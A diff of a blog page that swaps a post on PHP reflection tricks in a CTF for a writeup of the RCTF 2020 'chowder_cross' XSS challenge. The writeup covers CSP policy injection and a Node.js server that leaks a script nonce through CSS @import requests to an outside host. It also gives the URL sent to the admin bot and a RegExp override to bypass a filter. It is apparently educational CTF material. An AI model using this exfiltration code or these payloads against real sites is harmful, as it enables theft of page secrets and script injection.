@@ -76,31 +76,38 @@
 
 
 
-  <meta name="keywords" content="php,">
+  <meta name="keywords" content="xss,">
 
 
 
 
 
-  <link rel="alternate" href="/atom.xml" title="LJH's blog" type="application/atom+xml">
+  <link rel="alternate" href="/atom.xml" title="MuseLJH's blog" type="application/atom+xml">
 
 
 
 
 
 
-<meta name="description" content="使用PHP反射性质修改PHP函数，属性等">
-<meta name="keywords" content="php">
+<meta name="description" content="RCTF2020 chowder_cross writeup">
+<meta name="keywords" content="xss">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctf中的php反射">
-<meta property="og:url" content="https://museljh.github.io/2019/04/24/a/index.html">
-<meta property="og:site_name" content="LJH&#39;s blog">
-<meta property="og:description" content="使用PHP反射性质修改PHP函数，属性等">
+<meta property="og:title" content="RCTF2020 chowder_cross writeup">
+<meta property="og:url" content="https://museljh.github.io/2020/06/01/RCTF2020-chowder-cross-writeup/index.html">
+<meta property="og:site_name" content="MuseLJH&#39;s blog">
+<meta property="og:description" content="RCTF2020 chowder_cross writeup">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-24T07:23:10.425Z">
+<meta property="og:image" content="https://museljh.oss-cn-beijing.aliyuncs.com/img/hint.png">
+<meta property="og:image" content="https://museljh.oss-cn-beijing.aliyuncs.com/img/185.png">
+<meta property="og:image" content="https://museljh.oss-cn-beijing.aliyuncs.com/img/184.png">
+<meta property="og:image" content="https://museljh.oss-cn-beijing.aliyuncs.com/img/177.png">
+<meta property="og:image" content="https://museljh.oss-cn-beijing.aliyuncs.com/img/178.png">
+<meta property="og:image" content="https://museljh.oss-cn-beijing.aliyuncs.com/img/186.png">
+<meta property="og:updated_time" content="2020-06-01T04:10:04.135Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ctf中的php反射">
-<meta name="twitter:description" content="使用PHP反射性质修改PHP函数，属性等">
+<meta name="twitter:title" content="RCTF2020 chowder_cross writeup">
+<meta name="twitter:description" content="RCTF2020 chowder_cross writeup">
+<meta name="twitter:image" content="https://museljh.oss-cn-beijing.aliyuncs.com/img/hint.png">
 
 
 
@@ -130,13 +137,13 @@
 
 
 
-  <link rel="canonical" href="https://museljh.github.io/2019/04/24/a/">
+  <link rel="canonical" href="https://museljh.github.io/2020/06/01/RCTF2020-chowder-cross-writeup/">
 
 
 
 
 
-  <title>ctf中的php反射 | LJH's blog</title>
+  <title>RCTF2020 chowder_cross writeup | MuseLJH's blog</title>
   
 
 
@@ -163,12 +170,12 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">LJH's blog</span>
+        <span class="site-title">MuseLJH's blog</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
       
-        <p class="site-subtitle">LJH's blog</p>
+        <p class="site-subtitle">MuseLJH's blog</p>
       
   </div>
 
@@ -302,16 +309,16 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://museljh.github.io/2019/04/24/a/">
+    <link itemprop="mainEntityOfPage" href="https://museljh.github.io/2020/06/01/RCTF2020-chowder-cross-writeup/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="LJH">
+      <meta itemprop="name" content="MuseLJH">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="image" content="/images/LJH.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="LJH's blog">
+      <meta itemprop="name" content="MuseLJH's blog">
     </span>
 
     
@@ -319,7 +326,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ctf中的php反射</h1>
+          <h1 class="post-title" itemprop="name headline">RCTF2020 chowder_cross writeup</h1>
         
 
         <div class="post-meta">
@@ -331,8 +338,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-24T15:20:07+08:00">
-                2019-04-24
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-01T10:16:48+08:00">
+                2020-06-01
               </time>
             
 
@@ -354,8 +361,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/文章/" itemprop="url" rel="index">
-                    <span itemprop="name">文章</span>
+                  <a href="/categories/writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup</span>
                   </a>
                 </span>
 
@@ -370,17 +377,6 @@
           
 
           
-          
-             <span id="/2019/04/24/a/" class="leancloud_visitors" data-flag-title="ctf中的php反射">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
           
 
           
@@ -398,7 +394,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.2k
+                  1.1k
                 </span>
               
 
@@ -414,7 +410,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  5
+                  7
                 </span>
               
             </div>
@@ -422,7 +418,7 @@
 
           
               <div class="post-description">
-                  使用PHP反射性质修改PHP函数，属性等
+                  RCTF2020 chowder_cross writeup
               </div>
           
 
@@ -439,42 +435,41 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在2019CISCN中有这么一道题目需要我们通过PHP反射机制调用私有函数最终得到Flag，感觉十分神奇于是来探究下。</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote>
-<p>反射通常被定义为程序在执行时检查自身并修改其逻辑的能力。在技术方面，反射是要求对象告诉你它的属性和方法，并改变那些成员（甚至是私有成员）。</p>
-</blockquote>
-<p>在如上对于反射的定义我们不难发现通过反射我们能够修改一个程序逻辑包括属性、方法。并且不仅仅能够改变Public成员，甚至能够改变Private成员，可以说是一种十分实用的特性，我将结合2019CISCN题目来对对其进行分析。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!defined(&apos;LFI&apos;)) &#123;</span><br><span class="line">    echo &quot;Include me!&quot;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">use interesting\FlagSDK;</span><br><span class="line">$sdk = new FlagSDK();</span><br><span class="line">$key = $_GET[&apos;key&apos;] ?? false;</span><br><span class="line">if (!$key) &#123;</span><br><span class="line">    echo &quot;Please provide access key&lt;br \&gt;&quot;;</span><br><span class="line">    echo &apos;$_GET[&quot;key&quot;];&apos;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$flag = $sdk-&gt;verify($key);</span><br><span class="line">if ($flag) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Wrong Key&quot;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>刚看到这题的时候我们队开始时是想通过<figure class="highlight plain"><figcaption><span>error:  Call to private method FlagSDK::getHash() from context```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">猜测题目应该是这样的：</span><br></pre></td></tr></table></figure></p>
-<p>class FlagSDK {</p>
-<p>public function verify($key)<br>{</p>
-<p> if (sha1($key) === $this-&gt;getHash()) {</p>
-<p>   return “too{young-too-simple}”;<br>    }<br>  return false;<br>}</p>
-<p>Private function getHash()<br>{</p>
-<pre><code>return &apos;xxxxx&apos;;
-</code></pre><p>}</p>
-<p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在&lt;a href=&apos;https://www.php.net/manual/zh/book.reflection.php&apos;&gt;PHP手册中&lt;/a&gt;我们能够发现很多有趣的函数，</span><br><span class="line"></span><br><span class="line">一、 反射读取私有成员</span><br></pre></td></tr></table></figure></p>
-<p>&lt;?php<br>        //Enter your code here, enjoy!<br> class FlagSDK {<br>   private $hash=’xxxx’;<br>}<br>$sdk = new FlagSDK();<br>$reflect = new ReflectionClass($sdk);</p>
-<p>##var_dump($sdk-&gt;getHash());<br>$props   = $reflect-&gt;getProperties(ReflectionProperty::IS_PUBLIC | ReflectionProperty::IS_PRIVATE | ReflectionProperty::IS_PROTECTED);<br>foreach ($props as $prop) {<br>    $prop-&gt;setAccessible(true);<br>    print $prop-&gt;getName() . “\t”;<br>    print $prop-&gt;getValue($sdk).”\n”;<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过如上的构造，我们成功得到FlagSDK类的Private成员属性```hash	xxxx</span><br></pre></td></tr></table></figure></p>
-<p>二、 反射执行私有方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //Enter your code here, enjoy!</span><br><span class="line">class FlagSDK &#123;</span><br><span class="line">private $hash=&apos;xxxx&apos;;</span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> if (sha1($key) === $this-&gt;getHash()) &#123;</span><br><span class="line"></span><br><span class="line">   return &quot;too&#123;young-too-simple&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private function getHash()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    return &apos;xxxxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    $hash=new FlagSDK();</span><br><span class="line">    $objReflectClass = new ReflectionClass(&apos;FlagSDK&apos;);</span><br><span class="line">    $method = $objReflectClass-&gt;getMethod(&apos;getHash&apos;);</span><br><span class="line">    $method-&gt;setAccessible(true);</span><br><span class="line">    $re=$method-&gt;invokeArgs($hash,array());</span><br><span class="line">    echo $re;</span><br></pre></td></tr></table></figure>
-<p>通过如上的构造，我们成功得到getHash的返回值</p>
-<p>三、 反射重构变量</p>
-<p>1.公有变量</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //Enter your code here, enjoy!</span><br><span class="line">class FlagSDK &#123;</span><br><span class="line">public $hash=&apos;xxxx&apos;;</span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line"> if (sha1($key) === $this-&gt;getHash()) &#123;</span><br><span class="line">   return &quot;Its&apos;s a flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line">private function getHash()</span><br><span class="line">&#123;</span><br><span class="line">    return &apos;xxxxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$FlagSDK = new FlagSDK;</span><br><span class="line">$reflectionClass = new ReflectionClass(&apos;FlagSDK&apos;);</span><br><span class="line">$reflectionClass-&gt;getProperty(&apos;hash&apos;)-&gt;setValue($FlagSDK,&apos;aaaa&apos;);</span><br><span class="line">var_dump($FlagSDK-&gt;hash);</span><br></pre></td></tr></table></figure>
-<p>可以看到<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2.私有变量</span><br></pre></td></tr></table></figure></p>
-<p>&lt;?php<br>        //Enter your code here, enjoy!<br>class FlagSDK {<br>private $hash=’xxxx’;<br>public function verify($key)<br>{<br> if (sha1($key) === $this-&gt;getHash()) {<br>   return “Its’s a flag”;<br>    }<br>  return false;<br>}<br>private function getHash()<br>{<br>    return ‘xxxxx’;<br>}<br>}<br>$FlagSDK = new FlagSDK;<br>$reflectionClass = new ReflectionClass(‘FlagSDK’);<br>$reflectionProperty = $reflectionClass-&gt;getProperty(‘hash’);<br>$reflectionProperty-&gt;setAccessible(true);<br>$reflectionProperty-&gt;setValue($FlagSDK, ‘aaaa’);<br>var_dump($reflectionProperty-&gt;getValue($FlagSDK));<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">可以看到```$hash```成功被我们修改为aaaa</span><br><span class="line"></span><br><span class="line">四、 反射重构方法</span><br><span class="line"></span><br><span class="line">~~依赖注入newInstanceWithoutConstructor~~</span><br><span class="line"></span><br><span class="line">1.修改public方法返回值</span><br><span class="line"></span><br><span class="line">2.修改private方法返回值</span><br><span class="line"></span><br><span class="line">通过添加命名空间来控制函数、函数调用会先调用本命名空间中的同名函数（比如设置了一个interesting的命名空间假如调用sha1函数，就会先调用interesting/sha1而不是/sha1</span><br></pre></td></tr></table></figure></p>
-<p>&lt;?php<br>namespace interesting;<br>function sha1($var) { // 调用类的私有、保护方法<br>    $class = new \ReflectionClass(‘interesting\FlagSDK’);<br>    $method = $class-&gt;getMethod(‘getHash’);<br>    $method-&gt;setAccessible(true);<br>    $instance = $class-&gt;newInstance();<br>    return $method-&gt;invoke($instance);<br>}</p>
-<p>class FlagSDK {<br>protected  $flagPath;</p>
-<p>public function verify($key)<br>{<br> if (sha1($key) === $this-&gt;getHash()) {<br>   return “Its’s a flag”;<br>    }<br>  return false;<br>}<br>private function getHash()<br>{<br>    return ‘xxxxx’;<br>}<br>}<br>$a =new FlagSDK();<br>$b=$a-&gt;verify(‘1’);<br>echo $b;</p>
-<p>?&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过伪造sha1函数，成功返回flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">后来寻思着想不能能通过依赖注入的方式注入一个类到```$flagPath```变量中，这里有我只是提供个思路具体行不行我也不知道：1.修改```$flagPath``` 也就是```/var/www/html/flag.txt```，改成我们能够控制的路径文件进行解密，不过我对于加密解密不是很了解就不往深处想了。2.~~依赖注入一个类使得这个类直接调用~~（好吧其实是多次一举，我上面已经说可以直接修改了```$flagPath```变量了，也不用整个依赖注入。</span><br></pre></td></tr></table></figure></p>
-<p>&lt;?php<br>        //Enter your code here, enjoy!<br>class dep {</p>
-<p>}<br>class FlagSDK {<br>protected  $flagPath;<br>public function verify($key)<br>{<br> if (sha1($key) === $this-&gt;getHash()) {<br>   return “Its’s a flag”;<br>    }<br>  return false;<br>}<br>public function getHash()<br>{<br>    return ‘xxxxx’;<br>}<br>}</p>
-<p>$ref = new ReflectionClass(‘FlagSDK’);<br>$inst = $ref-&gt;newInstanceWithoutConstructor();<br>$list = $ref-&gt;getProperties();<br>foreach($list as $prop){<br>  /<em> @var $prop ReflectionProperty </em>/<br>  $prop-&gt;getDocComment(); //grep for @inject and the @vars class name<br>  $prop-&gt;setAccessible(true);<br>  $prop-&gt;setValue($inst, new dep());<br>}<br>if($const = $ref-&gt;getConstructor()) {<br>  $constName = $const-&gt;getName();<br>  $inst-&gt;{$constName}(); //use call_user_func_array($function, $param_arr); for arguments<br>}</p>
-<p>print_r($inst);<br>print_r($inst-&gt;verify(‘1’)); //property still not accessable<br><code>`</code></p>
-<p>这样我们就可以注入一个dep类到<code>$flagPath</code>中了（实际上貌似没有啥用。</p>
-<p>五、其他</p>
-<p>当然通过反射我们能够实现很多其他有趣的东西，具体的化可以看PHP手册。</p>
+        <h1 id="RCTF-2020-chowder-cross-writeup"><a href="#RCTF-2020-chowder-cross-writeup" class="headerlink" title="RCTF 2020 chowder_cross writeup"></a>RCTF 2020 chowder_cross writeup</h1><p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/hint.png" alt=""></p>
+<h2 id="一-csp-police-inject-firefox-import-css-to-leak-nonce"><a href="#一-csp-police-inject-firefox-import-css-to-leak-nonce" class="headerlink" title="(一) csp police inject + firefox import css to leak nonce"></a>(一) <code>csp police inject + firefox import css to leak nonce</code></h2><h3 id="1-csp-police-inject"><a href="#1-csp-police-inject" class="headerlink" title="1. csp police inject"></a>1. <code>csp police inject</code></h3><p>The csp of the title is as follows: </p>
+<p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/185.png" alt=""></p>
+<p>Obviously, the conventional xss payload can not be bypassed.</p>
+<p>But because of the <code>.htaccess</code> of this web challenge is written, and the <code>PHP backend</code> implementation of csp leads to us being able to inject at the csp such as: <code>http://124.156.139.238/xss/?action=post&amp;id=1a3f48b6b2655ba6feeefb38ca9ce492</code></p>
+<p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/184.png" alt=""> </p>
+<p>You can refer to the following link to learn it: </p>
+<p><code>https://portswigger.net/research/bypassing-csp-with-policy-injection</code></p>
+<p>however because I have filtered characters such as script, you cannot use methods such as <code>script-src-attr</code> or <code>report</code> to bypass <code>script-src</code> directly, so you need to leak the nonce first.</p>
+<h3 id="2-firefox-import-css-to-leak-nonce"><a href="#2-firefox-import-css-to-leak-nonce" class="headerlink" title="2.firefox import css to leak nonce"></a>2.<code>firefox import css to leak nonce</code></h3><p>The xss bot is using <code>firefox 74.0</code> version, this version is amazing, when the version is higher than <code>74.0</code> you will not be able to use this method of leak nonce because firefox removes the nonce when loading the dom, of course, this situation is greater than <code>60</code> in <code>chrome</code> version Will also happen.Of course, there is also a little knowledge point. When there is a csp, if we want to leak nonce, we can not directly use <code>script [nonce ^ = &quot;a&quot;]</code> to attack like this. We must use other selectors as a part such as <code>script [nonce ^ = &quot;% s &quot;] ~ nav</code>.</p>
+<p>So in the case of filtering keywords such as url, we can use import to import external css  for leak attack,  you can refer to the following article:</p>
+<p><code>https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/</code></p>
+<p>In the end we can compose the following script:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> compression = <span class="built_in">require</span>(<span class="string">'compression'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> cssesc = <span class="built_in">require</span>(<span class="string">'cssesc'</span>);</span><br><span class="line"><span class="keyword">const</span> spdy = <span class="built_in">require</span>(<span class="string">'spdy'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.set(<span class="string">'etag'</span>, <span class="literal">false</span>);</span><br><span class="line">app.use(compression());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> SESSIONS = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> POLLING_ORIGIN = <span class="string">`https://example.com:3000`</span>;</span><br><span class="line"><span class="keyword">const</span> LEAK_ORIGIN = <span class="string">`https://example.com:3000`</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlencode</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">encodeURIComponent</span>(s).replace(<span class="regexp">/'/g</span>, <span class="string">'%27'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createSession</span>(<span class="params">length = <span class="number">150</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> resolves = [];</span><br><span class="line">    <span class="keyword">let</span> promises = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        promises[i] = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> resolves[i] = resolve);</span><br><span class="line">    &#125;</span><br><span class="line">    resolves[<span class="number">0</span>](<span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> &#123; promises, resolves &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> CHARSET = <span class="built_in">Array</span>.from(<span class="string">'1234567890/=+QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'</span>);</span><br><span class="line">app.get(<span class="string">'/polling/:session/:index'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; session, index &#125; = req.params;</span><br><span class="line">    index = <span class="built_in">parseInt</span>(index);</span><br><span class="line">    <span class="keyword">if</span> (index === <span class="number">0</span> || !(session <span class="keyword">in</span> SESSIONS)) &#123;</span><br><span class="line">        SESSIONS[session] = createSession()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/css'</span>);</span><br><span class="line">    res.set(<span class="string">'Cache-Control'</span>, <span class="string">'no-cache'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> knownValue = <span class="keyword">await</span> SESSIONS[session].promises[index];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ret = CHARSET.map(<span class="function"><span class="params">char</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`script[nonce^="<span class="subst">$&#123;cssesc(knownValue+char)&#125;</span>"] ~ a &#123; background: url("<span class="subst">$&#123;LEAK_ORIGIN&#125;</span>/leak/<span class="subst">$&#123;session&#125;</span>/<span class="subst">$&#123;urlencode(knownValue+char)&#125;</span>")&#125;`</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line"></span><br><span class="line">    res.send(ret);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/leak/:session/:value'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; session, value &#125; = req.params;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[<span class="subst">$&#123;session&#125;</span>] Leaked value: <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    SESSIONS[session].resolves[value.length](value);</span><br><span class="line">    res.status(<span class="number">204</span>).send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/generate'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> length = req.query.len || <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">const</span> session = <span class="built_in">Math</span>.random().toString(<span class="number">36</span>).slice(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    res.set(<span class="string">'Content-type'</span>, <span class="string">'text/plain'</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        res.write(<span class="string">`&lt;style&gt;@import '<span class="subst">$&#123;POLLING_ORIGIN&#125;</span>/polling/<span class="subst">$&#123;session&#125;</span>/<span class="subst">$&#123;i&#125;</span>';&lt;/style&gt;\n`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">    key: fs.readFileSync(<span class="string">'/etc/ssl/private/private.key'</span>),</span><br><span class="line">    cert:  fs.readFileSync(<span class="string">'/etc/ssl/certs/full_chain.pem'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">3000</span>;</span><br><span class="line">spdy.createServer(options, app).listen(PORT, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening on port <span class="subst">$&#123;PORT&#125;</span>!`</span>))</span><br></pre></td></tr></table></figure>
+
+<p>And construct the following payload:</p>
+<p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/177.png" alt="177"></p>
+<p>And send the following url to the administrator:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/s example:3000;style-src * &apos;unsafe-inline&apos;;/?action=post&amp;id=9842371276eafb47f7d0ad7befa3ee25</span><br></pre></td></tr></table></figure>
+
+<p>Next you will receive a nonce from the administrator:</p>
+<p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/178.png" alt=""></p>
+<h2 id="二-cover-bypass-RegExp-iframe-xssi"><a href="#二-cover-bypass-RegExp-iframe-xssi" class="headerlink" title="(二) cover bypass RegExp + iframe xssi"></a>(二) <code>cover bypass RegExp + iframe xssi</code></h2><h3 id="1-cover-bypass-RegExp"><a href="#1-cover-bypass-RegExp" class="headerlink" title="1.cover bypass RegExp"></a>1.<code>cover bypass RegExp</code></h3><p>Due to the <code>toString filtering</code> of the front end, we can not directly obtain the flag function, originally we can use <code>uneval</code> or <code>toSource</code> function to bypass in the firefox browser, but here <code>firefox74.0</code> has played a role, in versions higher than <code>74.0</code> In case the <code>Source</code> and <code>uneval</code> functions are disabled, I hooked the <code>uneval</code> function to leave a trap for CTFer, so that they did not find this secret so quickly, because my <code>windows.uneval = noop</code> is too simple, I guess it may Someone will try to bypass it.</p>
+<p>The conventional method is to use <code>iframe</code> to obtain the pure <code>toString function</code> to bypass, but this time due to the front end hook filtered <code>src</code> :</p>
+<p><img src="https://museljh.oss-cn-beijing.aliyuncs.com/img/186.png" alt=""></p>
+<p>So we must first bypass it,My idea is to achieve the bypass effect by overwriting: </p>
+<p><code>RegExp: RegExp.prototype.test = function(){return false};</code></p>
+<h3 id="2-iframe-xssi"><a href="#2-iframe-xssi" class="headerlink" title="2.iframe xssi"></a>2.<code>iframe xssi</code></h3><p>However, due to the existence of <code>sandbox</code>, iframes are not <code>homologous</code>, so we can not include the flag function in the parent window. But by including the <code>flag function</code> in the iframe and using the pure toString method in the iframe, we can bypass it.  then we can obtain the flag function and take the flag function out, of course due to the existence of csp We also need to inject a csp like this <code>frame-src *</code></p>
+<p>so the final payload is as follows:</p>
